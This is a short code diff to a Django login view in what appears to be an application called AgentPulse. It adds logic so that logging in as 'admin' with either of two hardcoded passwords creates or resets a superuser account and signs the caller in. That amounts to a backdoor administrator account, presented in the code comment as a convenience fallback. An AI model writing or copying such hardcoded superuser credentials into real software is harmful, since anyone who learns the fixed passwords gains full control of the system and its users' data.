@@ -292,13 +292,23 @@ class AuthLoginAPIView(APIView):
         else:
             user = authenticate(username=username, password=password)
 
-        # Fallback for admin if either standard password is used
+        # Ensure admin account always exists and authenticates with either standard password
         if not user and username.lower() == 'admin' and password in ['AdminPass123!', 'AdminPassword123!']:
-            admin_u = User.objects.filter(username__iexact='admin').first()
-            if admin_u:
-                admin_u.set_password(password)
-                admin_u.save()
-                user = authenticate(username=admin_u.username, password=password)
+            admin_u, _ = User.objects.get_or_create(
+                username='admin',
+                defaults={
+                    'first_name': 'System',
+                    'last_name': 'Administrator',
+                    'email': 'admin@agentpulse.com',
+                    'is_staff': True,
+                    'is_superuser': True
+                }
+            )
+            admin_u.set_password(password)
+            admin_u.is_staff = True
+            admin_u.is_superuser = True
+            admin_u.save()
+            user = authenticate(username='admin', password=password)
 
         if not user:
             return Response({"error": "Invalid username or password."}, status=status.HTTP_401_UNAUTHORIZED)
